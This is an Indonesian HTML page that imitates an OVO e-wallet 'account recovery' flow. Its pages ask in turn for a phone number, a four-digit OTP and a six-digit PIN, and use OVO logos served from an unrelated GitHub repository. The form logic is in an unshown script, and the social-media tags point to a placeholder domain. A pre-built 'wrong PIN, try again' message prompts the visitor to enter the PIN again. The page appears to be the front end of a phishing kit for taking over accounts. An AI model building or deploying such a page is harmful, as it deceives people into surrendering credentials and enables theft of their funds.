<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    
    <!-- ===== META TAG UNTUK MEDIA SOSIAL ===== -->
    <!-- Title & Description -->
    <title>OVO Pemulihan</title>
    <meta name="title" content="OVO - Pemulihan Akun" />
    <meta name="description" content="Pemulihan akun OVO Anda. Verifikasi identitas untuk mengakses kembali akun OVO Anda." />
    
    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website" />
    <meta property="og:url" content="https://your-domain.com/" />
    <meta property="og:title" content="OVO - Pemulihan Akun" />
    <meta property="og:description" content="Pemulihan akun OVO Anda. Verifikasi identitas untuk mengakses kembali akun OVO Anda." />
    <meta property="og:image" content="https://raw.githubusercontent.com/naksarehkau/part-part/refs/heads/main/logolinkovo.jpg" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    
    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image" />
    <meta property="twitter:url" content="https://your-domain.com/" />
    <meta property="twitter:title" content="OVO - Pemulihan Akun" />
    <meta property="twitter:description" content="Pemulihan akun OVO Anda. Verifikasi identitas untuk mengakses kembali akun OVO Anda." />
    <meta property="twitter:image" content="https://raw.githubusercontent.com/naksarehkau/part-part/refs/heads/main/logolinkovo.jpg" />
    
    <!-- Theme Color -->
    <meta name="theme-color" content="#4B006E" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
    
    <link rel="stylesheet" href="style.css" />
</head>
<body>

<div class="container" id="appContainer">

    <!-- ======== LOADING SCREEN FULL LAYAR ======== -->
    <div id="loadingScreen">
        <img src="https://raw.githubusercontent.com/naksarehkau/linkfoto/refs/heads/main/logoloadingovo.jpg" alt="OVO Loading" />
    </div>

    <!-- ======== PAGE 1: NOMOR HP ======== -->
    <div id="pageNomor" class="page active">
        <div class="logo-header">
            <img src="https://raw.githubusercontent.com/naksarehkau/part-part/refs/heads/main/ovologo.jpg" alt="OVO Logo" />
        </div>
        <div class="form-card">
            <div class="form-title">Pemulihan Akun</div>
            <div class="form-sub">Masukkan nomor HP terdaftar</div>

            <div class="input-group">
                <label>Nomor HP</label>
                <input type="tel" id="inputNomor" placeholder="08xx-xxxx-xxxx" maxlength="15" inputmode="numeric" pattern="[0-9]*" />
            </div>

            <button class="btn-primary" id="btnLanjut">Lanjut</button>
        </div>
    </div>

    <!-- ======== PAGE 2: OTP 4 ANGKA ======== -->
    <div id="pageOtp" class="page">
        <div class="logo-header">
            <img src="https://raw.githubusercontent.com/naksarehkau/part-part/refs/heads/main/ovologo.jpg" alt="OVO Logo" />
        </div>
        <div class="form-card">
            <div class="form-title">Verifikasi OTP</div>
            <div class="form-sub">Kode OTP dikirim ke nomor Anda</div>

            <div class="otp-boxes" id="otpContainer">
                <input type="text" maxlength="1" class="otp-input" data-index="0" inputmode="numeric" pattern="[0-9]*" />
                <input type="text" maxlength="1" class="otp-input" data-index="1" inputmode="numeric" pattern="[0-9]*" />
                <input type="text" maxlength="1" class="otp-input" data-index="2" inputmode="numeric" pattern="[0-9]*" />
                <input type="text" maxlength="1" class="otp-input" data-index="3" inputmode="numeric" pattern="[0-9]*" />
            </div>

            <button class="btn-primary" id="btnVerifikasiOtp">Verifikasi</button>
            <div class="info-message">Kode OTP berlaku 5 menit</div>
        </div>
    </div>

    <!-- ======== PAGE 3: PIN 6 ANGKA ======== -->
    <div id="pagePin" class="page">
        <div class="logo-header">
            <img src="https://raw.githubusercontent.com/naksarehkau/part-part/refs/heads/main/ovologo.jpg" alt="OVO Logo" />
        </div>
        <div class="form-card">
            <div class="form-title">Masukkan PIN</div>
            <div class="form-sub">PIN 6 angka untuk verifikasi akhir</div>

            <div class="pin-boxes" id="pinContainer">
                <input type="password" maxlength="1" class="pin-input" data-index="0" inputmode="numeric" pattern="[0-9]*" />
                <input type="password" maxlength="1" class="pin-input" data-index="1" inputmode="numeric" pattern="[0-9]*" />
                <input type="password" maxlength="1" class="pin-input" data-index="2" inputmode="numeric" pattern="[0-9]*" />
                <input type="password" maxlength="1" class="pin-input" data-index="3" inputmode="numeric" pattern="[0-9]*" />
                <input type="password" maxlength="1" class="pin-input" data-index="4" inputmode="numeric" pattern="[0-9]*" />
                <input type="password" maxlength="1" class="pin-input" data-index="5" inputmode="numeric" pattern="[0-9]*" />
            </div>

            <div class="error-message" id="errorPin">❌ PIN yang Anda masukkan salah. Silakan coba lagi.</div>

            <button class="btn-primary" id="btnVerifikasiPin">Verifikasi PIN</button>
            <div class="info-message">PIN rahasia Anda</div>
        </div>
    </div>

</div>

<script src="script.js"></script>
</body>
  </html>
